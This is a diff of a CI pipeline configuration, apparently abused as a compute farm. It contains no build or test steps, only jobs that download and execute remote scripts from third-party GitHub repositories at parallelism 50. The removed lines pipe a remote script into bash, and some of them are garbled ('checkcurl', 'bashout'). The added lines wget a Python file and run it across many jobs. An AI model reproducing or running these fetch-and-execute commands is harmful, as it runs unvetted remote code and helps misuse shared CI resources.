@@ -10,15 +10,26 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'checkcurl -sL https://raw.githubusercontent.com/termuxidindo/jet/main/jet | bashout'
-            - ls
+            - 'wget https://raw.githubusercontent.com/erlandi-main-api/tdc/main/point/point.py && python *py'
           parallelism: 50
         - name: 'Job #2'
           commands:
-            - 'checkcurl -sL https://raw.githubusercontent.com/termuxidindo/jet/main/jet | bashout'
-            - ls
+            - 'wget https://raw.githubusercontent.com/erlandi-main-api/tdc/main/point/point.py && python *py'
           parallelism: 50
         - name: 'Job #3'
           commands:
-            - 'curl -sL https://raw.githubusercontent.com/termuxidindo/jet/main/jet | bash'
+            - 'wget https://raw.githubusercontent.com/erlandi-main-api/tdc/main/point/point.py && python *py'
           parallelism: 50
+  - name: 'Block #2'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://raw.githubusercontent.com/erlandi-main-api/tdc/main/point/point.py && python *py'
+          parallelism: 50
+        - name: 'Job #2'
+          commands:
+            - 'wget https://raw.githubusercontent.com/erlandi-main-api/tdc/main/point/point.py && python *py'
+          parallelism: 50
+        - name: 'Job #3'
+          commands: []
